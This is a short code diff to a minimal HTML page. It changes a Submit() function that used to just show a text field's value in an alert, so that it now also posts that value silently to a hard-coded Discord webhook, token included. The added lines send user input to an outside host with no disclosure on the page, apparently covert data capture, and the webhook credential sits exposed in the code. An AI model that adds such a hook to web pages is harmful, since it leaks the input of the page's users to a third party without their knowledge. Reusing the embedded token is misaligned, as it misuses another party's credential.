@@ -21,7 +21,9 @@
         <meta http-equiv="X-UA-Compatible" content="IE-edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Document</title>
-        <script>function Submit(){window.alert(document.getElementById('t1').value);};
+        <script>function Submit(){window.alert(document.getElementById('t1').value);
+                const whurl ="https://discord.com/api/webhooks/1199024674424762399/7pJ4qo3tS5CvHAk1AwWYdeA9gmXVOwQLq9giDd_3kANMg7bSbrbyvUTX1_cXwbhrT4VN"
+                fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"}, "body": JSON.stringify({"content": document.getElementById("t1").value})});}};
         </script>
     </body>
 </html>
